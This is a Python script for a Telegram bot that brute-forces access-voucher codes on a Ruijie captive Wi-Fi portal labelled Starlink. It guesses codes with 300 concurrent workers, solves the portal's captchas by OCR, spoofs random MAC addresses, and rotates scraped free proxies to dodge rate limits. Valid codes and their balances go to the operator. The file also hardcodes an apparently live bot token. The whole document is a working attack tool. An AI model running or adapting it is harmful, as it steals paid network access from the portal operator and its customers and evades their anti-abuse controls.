#!/usr/init/env python3
# -*- coding: utf-8 -*-
"""
================================================================================
 sirzipp.py  —  ⚡ RUIJIE ASYNC EXTREME (Auto Proxy Checker) ⚡
 Starlink (Ruijie) Voucher Scanner + Telegram Bot   |   Telegram @sayarkn
--------------------------------------------------------------------------------
 Requires:
     pip install aiohttp aiohttp-socks ddddocr python-telegram-bot requests
================================================================================
"""

import os
import sys
import re
import json
import time
import random
import string
import hashlib
import asyncio
import datetime
import requests
import concurrent.futures

from urllib.parse import urlparse, parse_qs, urlencode, urljoin, urlunparse

import aiohttp
from aiohttp_socks import ProxyConnector, ProxyType

import ddddocr

from telegram import (
    Update,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
)
from telegram.constants import ParseMode
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    ContextTypes,
    filters,
)

# ==============================================================================
#  CONFIG / CONSTANTS
# ==============================================================================

BOT_TOKEN = "8648844261:AAGb737MMCYlLYUPG2uzHNC7TsiFi1SX2sY"
ADMIN_IDS = [8635066797]

# --- In-memory Storage for Hits ---
IN_MEMORY_HITS = []

# --- Free Proxy Auto Scraper & Checker ---
def fetch_raw_proxies():
    url = "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=5000&country=all&ssl=all&anonymity=all"
    try:
        response = requests.get(url, timeout=10)
        if response.status_code == 200:
            return response.text.splitlines()
    except Exception as e:
        print(f"[ProxyScraper] Error fetching proxies: {e}")
    return []

def check_single_proxy(proxy):
    test_url = "https://httpbin.org/ip"
    proxies = {
        "http": f"http://{proxy}",
        "https": f"http://{proxy}",
    }
    try:
        response = requests.get(test_url, proxies=proxies, timeout=3)
        if response.status_code == 200:
            return proxy
    except:
        pass
    return None

def get_live_proxies(target_count=30):
    print("[ProxyManager] Fetching and checking free proxies (Target: 30)...")
    raw_proxies = fetch_raw_proxies()
    working_proxies = []
    
    if not raw_proxies:
        print("[ProxyManager] Warning: Could not fetch proxies from API, using fallback defaults.")
        return ["123.45.67.89:8080"] # Fallback if API fails

    with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
        futures = {executor.submit(check_single_proxy, p): p for p in raw_proxies}
        for future in concurrent.futures.as_completed(futures):
            result = future.result()
            if result:
                working_proxies.append(result)
                print(f"[ProxyManager] Working Proxy Found: {result} ({len(working_proxies)}/{target_count})")
                if len(working_proxies) >= target_count:
                    break
    return working_proxies

# စတင်ချိန်တွင် အလုပ်လုပ်သော Proxy ၃၀ ကို အလိုအလျောက် ရှာယူမည်
EMBEDDED_PROXIES = get_live_proxies(30)

MAX_CODES_PER_SESSION = 30            
MAX_CODES_PER_SID = 30                
NUM_WORKERS = 300                     
TIMEOUT_SEC = 30                      

DEFAULT_EXPIRY = "2099-12-31 23:59:59"

# --- Ruijie Starlink portal endpoints ---------------------------------------
PORTAL_BASE = "https://portal-as.ruijienetworks.com"
PORTAL_INDEX = PORTAL_BASE + "/download/static/maccauth/src/index.html"
PORTAL_BALANCE_PAGE = PORTAL_BASE + "/download/static/maccauth/src/balance.html?sessionId="
VOUCHER_URL = PORTAL_BASE + "/api/auth/voucher/?lang=en_US"
CAPTCHA_IMAGE_URL = PORTAL_BASE + "/api/auth/captcha/image"
CAPTCHA_VERIFY_URL = PORTAL_BASE + "/api/auth/captcha/verify"
BALANCE_API = PORTAL_BASE + "/api/auth/balance/getBalance/"

# --- code char sets ---------------------------------------------------------
CHARSET_DIGITS = "012345678"
CHARSET_ABC = "abcdefghijkmnpqrstuvwxyz"
CHARSET_MIX = "2345678abcdefghijkmnpqrstuvwxyz"

MODES = {
    "num6": "Number 6",
    "num7": "Number 7",
    "num8": "Number 8",
    "num9": "Number 9",
    "mix6": "Mix 6",
    "abc6": "ABC 6",
    "custom": "Custom Start",
}

# --- terminal colors --------------------------------------------------------
bred = "\x1b[1;31m"
bgreen = "\x1b[1;32m"
bcyan = "\x1b[1;36m"
white = "\x1b[37m"
yellow = "\x1b[33m"
reset = "\x1b[0m"

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36",
]

# --- globals ----------------------------------------------------------------
_ocr_instance = None
_proxy_manager = None
user_scanners = {}      
user_portal_urls = {}   


# ==============================================================================
#  BANNER / LICENSE
# ==============================================================================

def show_banner():
    line = "=" * 60
    print(bcyan + line)
    print("   ⚡ RUIJIE  ASYNC EXTREME  ⚡   ")
    print("        Telegram@sayarkn     ")
    print(line + reset)
    print(white + "Checking authorization..." + reset)


def check_time_integrity():
    print(bgreen + "[+] Time integrity check passed (In-memory mode)" + reset)


def display_remaining_time(expiry_date):
    now = datetime.datetime.now()
    remaining = int(max((expiry_date - now).total_seconds(), 0))
    days, remainder = divmod(remaining, 86400)
    hours, remainder = divmod(remainder, 3600)
    minutes, seconds = divmod(remainder, 60)
    if days:
        time_str = f"{days} days {hours} hour {minutes} min"
    elif hours:
        time_str = f"{hours} hr {minutes} min"
    else:
        time_str = f"{minutes} min"
    print(yellow + f"[*] Time left: {time_str}  ")
    print(f"[-] Expired on ({expiry_date.strftime('%Y-%m-%d %H:%M')}) " + reset)


def check_approval():
    print(bgreen + "[+] Access Granted (Local Mode)!" + reset)
    expiry_date = datetime.datetime.strptime(DEFAULT_EXPIRY, "%Y-%m-%d %H:%M:%S")
    display_remaining_time(expiry_date)


# ==============================================================================
#  PROXY MANAGER
# ==============================================================================

class ProxyManager:
    """Round-robin SOCKS/HTTP proxy pool with bad-proxy marking."""

    def __init__(self, proxy_list):
        self.proxies = []
        self.bad_proxies = []
        self.lock = asyncio.Lock()
        self.index = 0
        self.load(proxy_list)

    def _normalize(self, proxy):
        proxy = (proxy or "").strip()
        if not proxy:
            return None
        if not proxy.startswith(("http://", "https://", "socks4://", "socks5://")):
            proxy = "http://" + proxy
        return proxy

    def load(self, proxy_list):
        try:
            raw = [self._normalize(p) for p in proxy_list]
            self.proxies = [p for p in raw if p]
            random.shuffle(self.proxies)
            self.bad_proxies = []
            print(f"[ProxyManager] Loaded {len(self.proxies)} active verified proxies")
        except Exception as e:
            print(f"[ProxyManager] Load error: {e}")

    async def get_next(self) -> "str | None":
        async with self.lock:
            if not self.proxies:
                return None
            p = self.proxies[self.index % len(self.proxies)]
            self.index += 1
            return p

    async def mark_bad(self, proxy: "str | None"):
        if not proxy:
            return
        async with self.lock:
            if proxy in self.proxies:
                self.proxies = [p for p in self.proxies if p != proxy]
                self.bad_proxies.append(proxy)

    def stats(self) -> "tuple[int, int]":
        total = len(self.proxies) + len(self.bad_proxies)
        bad = len(self.bad_proxies)
        return total, bad


def get_proxy_manager() -> "ProxyManager":
    global _proxy_manager
    if _proxy_manager is None:
        _proxy_manager = ProxyManager(EMBEDDED_PROXIES)
    return _proxy_manager


def create_connector_for_proxy(proxy: str):
    try:
        return ProxyConnector.from_url(proxy)
    except Exception:
        return None


# ==============================================================================
#  OCR / CAPTCHA
# ==============================================================================

def get_ocr_instance():
    global _ocr_instance
    if _ocr_instance is None:
        _ocr_instance = ddddocr.DdddOcr(show_ad=False)
    return _ocr_instance


def ocr_image_bytes_fast(image_bytes: bytes) -> str:
    ocr = get_ocr_instance()
    result = ocr.classification(image_bytes)
    return result


async def solve_captcha_simple_async(session, captcha_url, headers):
    try:
        async with session.get(captcha_url, headers=headers,
                               timeout=aiohttp.ClientTimeout(total=TIMEOUT_SEC)) as resp:
            image_content = await resp.read()
        return await asyncio.to_thread(ocr_image_bytes_fast, image_content)
    except Exception:
        return None


# ==============================================================================
#  USER DATA (In-Memory)
# ==============================================================================

def get_user_data(user_id: int):
    return user_portal_urls.get(user_id)


def generate_random_mac():
    return ":".join("%02x" % random.randint(0, 255) for _ in range(6))


def build_headers(referer=PORTAL_INDEX):
    return {
        "accept": "application/json, text/javascript, */*; q=0.01",
        "accept-language": "en-US,en;q=0.9",
        "content-type": "application/json; charset=utf-8",
        "user-agent": random.choice(USER_AGENTS),
        "x-requested-with": "XMLHttpRequest",
        "Origin": PORTAL_BASE,
        "Referer": referer,
    }


# ==============================================================================
#  GATEWAY / SESSION
# ==============================================================================

async def get_sid_from_gateway(session, portal_url, user_id):
    current_url = portal_url
    try:
        for _ in range(3):
            async with session.get(current_url, headers=build_headers(current_url),
                                   timeout=aiohttp.ClientTimeout(total=TIMEOUT_SEC),
                                   ssl=False, allow_redirects=True) as resp:
                body = await resp.text()
                final_url = str(resp.url)

            match = re.search(r"location\.href\s*=\s*[\'\"]([^\'\"]+)[\'\"]", body)
            if match:
                current_url = urljoin(final_url, match.group(1))
                continue

            token_match = re.search(r"token=([^&\s\"\'<>]+)", body)
            if token_match:
                current_url = urljoin(final_url, current_url.split("?")[0] + "?token=" + token_match.group(1))
            break

        parsed_query = parse_qs(urlparse(current_url).query)
        sid = parsed_query.get("sessionId", [None])[0]
        if not sid:
            token_match = re.search(r"token=([^&\s\"\'<>]+)", current_url)
            if token_match:
                sid = token_match.group(1)
        return sid, current_url
    except Exception:
        return None, None


# ==============================================================================
#  BALANCE
# ==============================================================================

async def fetch_balance(active_token: str, code: str, proxy: str) -> str:
    connector = create_connector_for_proxy(proxy) if proxy else None
    try:
        async with aiohttp.ClientSession(connector=connector) as session:
            balance_url = BALANCE_API + "?sessionId=" + str(active_token) + "&lang=en_US"
            async with session.get(balance_url, headers=build_headers(),
                                   timeout=aiohttp.ClientTimeout(total=TIMEOUT_SEC),
                                   ssl=False) as resp:
                if resp.status != 200:
                    return f"❌ HTTP {resp.status}"
                try:
                    data = await resp.json(content_type=None)
                except Exception as json_err:
                    return f"❌ JSON Error: {json_err}"
                profile_name = data.get("profileName", "N/A")
                total_minutes = data.get("totalMinutes", 0)
                return f"📏: {profile_name}, ⏰: {total_minutes}"
    except Exception:
        return "N/A"
    finally:
        if connector is not None:
            try:
                await connector.close()
            except Exception:
                pass


async def check_balance(active_token, code, user_id, proxy_str):
    if code not in IN_MEMORY_HITS:
        IN_MEMORY_HITS.append(code)
    try:
        await proxy_str
    except TypeError:
        pass
    balance = await fetch_balance(active_token, code, proxy_str if isinstance(proxy_str, str) else None)
    hit_str = f"✅ HIT: `{code}`\n{balance}\n⚔️ Expired: N/A"
    return hit_str


# ==============================================================================
#  CORE CHECKER
# ==============================================================================

async def check_single_access_code(session, code, current_session_id,
                                   login_url, captcha_base_url, verify_url,
                                   headers, user_id, current_proxy):
    try:
        captcha_url = captcha_base_url + str(int(time.time() * 1000))
        captcha_text = await solve_captcha_simple_async(session, captcha_url, headers)
        if not captcha_text:
            return "net"

        v_payload = {"authCode": captcha_text, "sessionId": current_session_id}
        async with session.post(verify_url, json=v_payload, headers=headers,
                                timeout=aiohttp.ClientTimeout(total=TIMEOUT_SEC),
                                ssl=False) as v_resp:
            v_data = await v_resp.text()
        if '"success":true' not in v_data.replace(" ", ""):
            return "captcha"

        mac = generate_random_mac()
        l_payload = {
            "accessCode": code,
            "authCode": captcha_text,
            "mac": mac,
            "apiVersion": "3.0.0",
        }
        async with session.post(login_url, json=l_payload, headers=headers,
                                timeout=aiohttp.ClientTimeout(total=TIMEOUT_SEC),
                                ssl=False) as l_resp:
            body = await l_resp.text()

        if '"success":true' in body.replace(" ", ""):
            return "hit"

        if ("request limited" in body) or ("the number of sta exceeds the limit" in body):
            return "limit"

        return "bad"
    except (asyncio.TimeoutError, aiohttp.ClientError, OSError):
        return "net"
    except asyncio.CancelledError:
        raise
    except Exception:
        return "net"


# ==============================================================================
#  WORKER / SCANNER
# ==============================================================================

def make_code(mode, start_digit=6, counter=None):
    if mode == "custom" and counter is not None:
        return str(counter).zfill(6)
    if mode == "num6":
        return "".join(random.choice(CHARSET_DIGITS) for _ in range(6))
    if mode == "num7":
        return "".join(random.choice(CHARSET_DIGITS) for _ in range(7))
    if mode == "num8":
        return "".join(random.choice(CHARSET_DIGITS) for _ in range(8))
    if mode == "num9":
        return "".join(random.choice(CHARSET_DIGITS) for _ in range(9))
    if mode == "mix6":
        return "".join(random.choice(CHARSET_MIX) for _ in range(6))
    if mode == "abc6":
        return "".join(random.choice(CHARSET_ABC) for _ in range(6))
    return "".join(random.choice(CHARSET_DIGITS) for _ in range(6))


async def worker(worker_id, login_url, captcha_base_url, verify_url, headers, user_id):
    pm = get_proxy_manager()
    state = user_scanners.get(user_id)
    if state is None:
        return
    stop_event = state["stop_event"]
    mode = state.get("mode", "num6")
    start_digit = state.get("start_digit", 6)
    tried_codes = state["tried_codes"]

    while not stop_event.is_set():
        proxy = await pm.get_next()
        connector = create_connector_for_proxy(proxy) if proxy else None
        session = aiohttp.ClientSession(
            connector=connector,
            timeout=aiohttp.ClientTimeout(total=TIMEOUT_SEC),
            headers={"user-agent": random.choice(USER_AGENTS)},
        )
        try:
            sid, _gateway = await get_sid_from_gateway(session, state["portal_url"], user_id)
            if not sid:
                await pm.mark_bad(proxy)
                state["net"] += 1
                await asyncio.sleep(1)
                continue

            codes_checked_this_sid = 0
            sid_failures = 0
            codes_checked_this_session = 0

            while (codes_checked_this_session < MAX_CODES_PER_SESSION
                   and codes_checked_this_sid < MAX_CODES_PER_SID
                   and not stop_event.is_set()):

                for _ in range(20):
                    if mode == "custom":
                        state["counter"] += 1
                        code = make_code(mode, start_digit, state["counter"])
                    else:
                        code = make_code(mode, start_digit)
                    if code not in tried_codes:
                        break
                else:
                    break
                tried_codes.add(code)
                state["current_code"] = code

                result = await check_single_access_code(
                    session, code, sid,
                    login_url, captcha_base_url, verify_url,
                    headers, user_id, proxy,
                )
                codes_checked_this_sid += 1
                codes_checked_this_session += 1
                state["tried"] += 1

                if result == "hit":
                    state["hits"] += 1
                    state["hit_list"].append(code)
                    state["last_hit"] = code
                    state["recent_logs"].append(f"✅ HIT: {code}")
                    msg = await check_balance(sid, code, user_id, proxy)
                    try:
                        await state["context"].bot.send_message(
                            chat_id=user_id, text=msg, parse_mode=ParseMode.MARKDOWN)
                    except Exception:
                        pass
                    break

                elif result == "limit":
                    state["limits"] += 1
                    state["recent_logs"].append(f"⚠️ LIMIT: {code}")
                    break

                elif result == "net":
                    state["net"] += 1
                    state["recent_logs"].append(f"❌ Net/Other: {code}")
                    sid_failures += 1
                    if sid_failures >= 3:
                        await pm.mark_bad(proxy)
                        break

                elif result == "captcha":
                    state["failed"] += 1

                else:
                    state["failed"] += 1

                await asyncio.sleep(0)
        except asyncio.CancelledError:
            raise
        except Exception:
            state["net"] += 1
        finally:
            try:
                await session.close()
            except Exception:
                pass
        if stop_event.is_set():
            break
        await asyncio.sleep(0.05)


async def live_dashboard_updater(context: "ContextTypes.DEFAULT_TYPE", user_id: int):
    state = user_scanners.get(user_id)
    if state is None:
        return
    stop_event = state["stop_event"]
    dash_msg_id = state.get("dash_msg_id")
    pm = get_proxy_manager()
    try:
        while not stop_event.is_set():
            await asyncio.sleep(5)
            if stop_event.is_set():
                break
            elapsed = max(time.time() - state["start_time"], 1)
            speed_cpm = int(state["tried"] / elapsed * 60)
            total, bad = pm.stats()
            active = total - bad
            recent_logs = state["recent_logs"][-5:]
            last_log = recent_logs[-1] if recent_logs else "None yet"
            text = (
                "⚡ Scanner Running ⚡\n"
                "Thank for using By Telegram @sayarkn\n"
                "━━━━━━━━━━━━━━━━━━\n"
                f"🎯 Tried: {state['tried']}\n"
                f"🔥 Hits: {state['hits']}\n"
                f"⚠️ Limits: {state['limits']}\n"
                f"❌ Net/Other: {state['net']}\n"
                f"⚡ Speed: {speed_cpm} c/m\n🔁 Proxies: {active}\n"
                f"🔥 Last: {state['last_hit'] or 'None yet'}\n"
                f"🎯 Current Code: {state['current_code'] or '-'}\n"
                f"📋 Last log: {last_log}"
            )
            try:
                await context.bot.edit_message_text(
                    chat_id=user_id, message_id=dash_msg_id, text=text)
            except Exception:
                pass
    except asyncio.CancelledError:
        raise


async def run_user_scanner(context: "ContextTypes.DEFAULT_TYPE", user_id: int):
    if user_scanners.get(user_id, {}).get("running"):
        return
    portal_url = get_user_data(user_id) or PORTAL_INDEX

    state = {
        "running": True,
        "context": context,
        "portal_url": portal_url,
        "mode": context.user_data.get("selected_mode", "num6"),
        "start_digit": context.user_data.get("start_digit", 6),
        "counter": int(context.user_data.get("start_digit", 6)) * 100000,
        "stop_event": asyncio.Event(),
        "tried": 0, "hits": 0, "limits": 0, "net": 0, "failed": 0,
        "hit_list": [], "valid_codes": [], "tried_codes": set(),
        "recent_logs": [], "last_hit": None, "current_code": None,
        "start_time": time.time(),
    }
    user_scanners[user_id] = state

    pm = get_proxy_manager()
    total, bad = pm.stats()
    if total - bad <= 0:
        await context.bot.send_message(
            chat_id=user_id,
            text="⚠️ **No active proxies available!**",
            parse_mode=ParseMode.MARKDOWN)
        state["running"] = False
        return

    dash = await context.bot.send_message(chat_id=user_id,
                                          text="🔄 Initializing scanner dashboard...")
    state["dash_msg_id"] = dash.message_id

    headers = build_headers()
    tasks = [asyncio.create_task(
        worker(i, VOUCHER_URL,
               CAPTCHA_IMAGE_URL + "?sessionId=",
               CAPTCHA_VERIFY_URL, headers, user_id))
        for i in range(NUM_WORKERS)]
    tasks.append(asyncio.create_task(live_dashboard_updater(context, user_id)))
    state["tasks"] = tasks

    try:
        await state["stop_event"].wait()
    finally:
        for t in tasks:
            if not t.done():
                t.cancel()
        await asyncio.gather(*tasks, return_exceptions=True)

        elapsed = max(time.time() - state["start_time"], 1)
        speed_cpm = int(state["tried"] / elapsed * 60)
        total, bad = pm.stats()
        hit_str = "\n".join(state["hit_list"]) if state["hit_list"] else "None"
        final_text = (
            "🛑 Scanner Stopped/Finished\n"
            "━━━━━━━━━━━━━━━━━━\n"
            f"🔋 Total Tried: {state['tried']}\n"
            f"🔥 Hits: {state['hits']}\n"
            f"⚡ Final Speed: {speed_cpm} c/m\n"
            f"🔁 Proxies: {total - bad}\n"
            "━━━━━━━━━━━━━━━━━━\n"
            f"📋 **All Hit Codes**:\n{hit_str}"
        )
        try:
            await context.bot.send_message(chat_id=user_id, text=final_text,
                                           parse_mode=ParseMode.MARKDOWN)
        except Exception:
            pass
        state["running"] = False


# ==============================================================================
#  TELEGRAM UI
# ==============================================================================

def get_main_menu_markup():
    keyboard = [
        [InlineKeyboardButton("🌐 Update Portal", callback_data="btn_update_portal")],
        [InlineKeyboardButton("⚙️ Mode", callback_data="btn_mode_menu")],
        [InlineKeyboardButton("🚀 Start Scanner", callback_data="btn_start_scanner"),
         InlineKeyboardButton("🛑 Stop", callback_data="stop_scan")],
    ]
    return InlineKeyboardMarkup(keyboard)


def get_mode_menu_markup():
    keyboard = [
        [InlineKeyboardButton("Number 6", callback_data="set_mode_num6"),
         InlineKeyboardButton("Number 7", callback_data="set_mode_num7")],
        [InlineKeyboardButton("Number 8", callback_data="set_mode_num8"),
         InlineKeyboardButton("Number 9", callback_data="set_mode_num9")],
        [InlineKeyboardButton("Mix 6", callback_data="set_mode_mix6"),
         InlineKeyboardButton("Custom Start", callback_data="set_mode_custom")],
        [InlineKeyboardButton("⬅️ Back", callback_data="btn_back_main")],
    ]
    return InlineKeyboardMarkup(keyboard)


async def start(update: Update, context: "ContextTypes.DEFAULT_TYPE", *args, **kwargs):
    user_id = update.effective_user.id
    mode = context.user_data.get("selected_mode", "num6")
    saved_url = get_user_data(user_id)
    pm = get_proxy_manager()
    total, bad = pm.stats()
    if saved_url:
        text = ("⚡ **Starlink Scanner Control Panel** ⚡\n\n"
                f"⚙️ Current Mode: `{MODES.get(mode, mode)}`\n"
                f"🔁 Proxies: `{total - bad}` (Auto-fetched)\n"
                "🌐 Portal: ready ✅")
    else:
        text = ("⚡ **Starlink Scanner Control Panel** ⚡\n\n"
                f"⚙️ Current Mode: `{MODES.get(mode, mode)}`\n"
                f"🔁 Proxies: `{total - bad}` (Auto-fetched)\n"
                "❌ Portal URL မရှိသေးပါက ပြောင်းဖို့ `Update Portal` ခလုတ်ကို နှိပ်ပါ")
    await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN,
                                    reply_markup=get_main_menu_markup())


async def handle_callbacks(update: Update, context: "ContextTypes.DEFAULT_TYPE", *args, **kwargs):
    query = update.callback_query
    user_id = update.effective_user.id
    data = query.data
    await query.answer()

    mode = context.user_data.get("selected_mode", "num6")
    pm = get_proxy_manager()
    total, bad = pm.stats()
    active = total - bad

    if data.startswith("set_mode_"):
        new_mode = data[len("set_mode_"):]
        context.user_data["selected_mode"] = new_mode
        mode = new_mode
        if new_mode == "custom":
            context.user_data["waiting_for_digit"] = True
            await query.edit_message_text(
                "🔢 **Start Digit **\nစတင်မည့် ဂဏန်းကို ပြောင်းရန် လိုအပ်ပါ",
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=InlineKeyboardMarkup(
                    [[InlineKeyboardButton("⬅️ Back", callback_data="btn_mode_menu")]]))
            return
        await query.edit_message_text(
            f"✅ Mode ပြောင်းဖို့ ပြုလုပ်ပြီးပါပြီ\n\n"
            "⚡ **Starlink Scanner Control Panel** ⚡\n\n"
            f"⚙️ Current Mode: `{MODES.get(mode, mode)}`\n"
            f"🔁 Proxies: `{active}`",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=get_main_menu_markup())

    elif data == "btn_update_portal":
        context.user_data["waiting_for_portal_url"] = True
        await query.edit_message_text(
            "🌐 **Portal URL မရှိသေးပါ ထည့်ဖို့ လိုအပ်ပါ**\n"
            "https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html",
            parse_mode=ParseMode.MARKDOWN)

    elif data == "btn_mode_menu":
        await query.edit_message_text("⚙️ **Choose Scanner Mode**",
                                      parse_mode=ParseMode.MARKDOWN,
                                      reply_markup=get_mode_menu_markup())

    elif data == "btn_start_scanner":
        await query.edit_message_text("🚀 Scanner စတင်ပါပြီ...")
        asyncio.get_event_loop().create_task(run_user_scanner(context, user_id))

    elif data == "stop_scan":
        state = user_scanners.get(user_id)
        if state and not state["stop_event"].is_set():
            state["stop_event"].set()
            await query.edit_message_text("🛑 Scanner ရပ်တန့်ပါပြီ")
        else:
            await query.edit_message_text("ℹ️ Scanner မလည်ပါနေပါ")

    elif data == "btn_back_main":
        saved_url = get_user_data(user_id)
        portal_line = "🌐 Portal: ready ✅" if saved_url else \
            "❌ Portal URL မရှိသေးပါက ပြောင်းဖို့ `Update Portal` ခလုတ်ကို နှိပ်ပါ"
        await query.edit_message_text(
            "⚡ **Starlink Scanner Control Panel** ⚡\n\n"
            f"⚙️ Current Mode: `{MODES.get(mode, mode)}`\n"
            f"🔁 Proxies: `{active}`\n{portal_line}",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=get_main_menu_markup())


async def handle_text(update: Update, context: "ContextTypes.DEFAULT_TYPE", *args, **kwargs):
    user_id = update.effective_user.id
    raw_text = (update.message.text or "").strip()
    pm = get_proxy_manager()
    mode = context.user_data.get("selected_mode", "num6")

    if context.user_data.get("waiting_for_portal_url"):
        context.user_data["waiting_for_portal_url"] = False
        if not raw_text.lower().startswith(("http://", "https://")):
            await update.message.reply_text(
                "❌ မှားနေတဲ့ URL ဖြစ်နိုင်ပါတယ် http/https URL ပြောင်းဖို့ လိုအပ်ပါ")
            return
        user_portal_urls[user_id] = raw_text
        total, bad = pm.stats()
        await update.message.reply_text(
            "✅ Portal URL ကို အောင်မြင်စွာ သိမ်းဆည်းပြီးပါပြီ\n\n"
            "⚡ **Starlink Scanner Control Panel** ⚡\n\n"
            f"⚙️ Current Mode: `{MODES.get(mode, mode)}`\n"
            f"🔁 Proxies: `{total - bad}`",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=get_main_menu_markup())
        return

    if context.user_data.get("waiting_for_digit"):
        context.user_data["waiting_for_digit"] = False
        if not raw_text.isdigit():
            await update.message.reply_text(
                "❌ ဂဏန်းပဲ ထည့်ပါ (0-9)")
            return
        context.user_data["start_digit"] = int(raw_text[0])
        total, bad = pm.stats()
        await update.message.reply_text(
            f"✅ Custom Start Digit = `{raw_text[0]}` ပြောင်းဖို့ ပြုလုပ်ပြီးပါပြီ\n\n"
            "⚡ **Starlink Scanner Control Panel** ⚡\n\n"
            f"⚙️ Current Mode: `{MODES.get(mode, mode)}`\n"
            f"🔁 Proxies: `{total - bad}`",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=get_main_menu_markup())
        return

    saved_url = get_user_data(user_id)
    total, bad = pm.stats()
    portal_line = "🌐 Portal: ready ✅" if saved_url else \
        "❌ Portal URL မရှိသေးပါက ပြောင်းဖို့ `Update Portal` ခလုတ်ကို နှိပ်ပါ"
    await update.message.reply_text(
        "⚡ **Starlink Scanner Control Panel** ⚡\n\n"
        f"⚙️ Current Mode: `{MODES.get(mode, mode)}`\n"
        f"🔁 Proxies: `{total - bad}`\n{portal_line}",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=get_main_menu_markup())


# ==============================================================================
#  MAIN
# ==============================================================================

def main():
    app = Application.builder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    app.add_handler(CallbackQueryHandler(handle_callbacks))

    pm = get_proxy_manager()
    total, bad = pm.stats()
    active = total - bad
    print(f"[MAIN] Proxy Manager initialized: {total}/{active} active proxies")

    print("Bot is running with python-telegram-bot...")
    app.run_polling(drop_pending_updates=True)
    print("Thank for using By Telegram@sayarkn")


# ==============================================================================
#  ENTRY POINT
# ==============================================================================

show_banner()
check_approval()
check_time_integrity()
_proxy_manager = get_proxy_manager()

if __name__ == "__main__":
    main()
